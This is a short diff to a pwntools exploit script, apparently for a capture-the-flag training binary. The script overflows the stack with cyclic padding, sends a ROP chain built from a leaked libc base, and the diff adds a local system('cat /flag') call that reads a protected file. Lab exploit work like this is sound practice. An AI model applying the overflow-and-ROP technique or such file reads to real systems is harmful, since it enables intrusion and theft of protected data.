@@ -1,4 +1,5 @@
 from pwn import *
+from os import system
 
 def main_9():
     exe = context.binary = ELF('/challenge/babystack_level9')
@@ -56,6 +57,8 @@ def main_9():
     print(f"base of libc: 0x{base_libc:x}")
 
     io.sendline(cyclic(2056) + rop(base_libc))
+
+    system("cat /flag")
 
     io.interactive()
 
